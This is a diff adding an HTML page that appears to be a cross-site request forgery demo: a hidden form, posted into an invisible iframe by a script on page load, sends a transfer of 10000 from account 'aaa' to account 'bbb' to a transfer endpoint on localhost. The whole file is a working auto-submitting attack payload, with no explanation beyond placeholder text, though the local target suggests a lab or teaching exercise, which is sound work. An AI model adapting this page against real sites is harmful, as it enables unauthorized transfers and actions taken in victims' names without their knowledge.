@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<iframe style="display: none" name="hiddenIframe"></iframe>
+<form id="hiddenIframe" target="hiddenIframe" method="post" action="http://localhost:8080/Csrf/transfer">
+    <input type="hidden" name="transferTo" value="bbb">
+    <input type="hidden" name="transferFrom" value="aaa">
+    <input type="hidden" name="amount" value="10000">
+</form>
+<script type="text/javascript">
+    window.onload=function (ev) {
+        document.getElementById("hiddenIframe").submit();
+    }
+</script>
+aaaaaaaaaaaaaaaa
+bbbbbbbbbbbbbbbb
+cccccccccccccccc
+</body>
+</html>
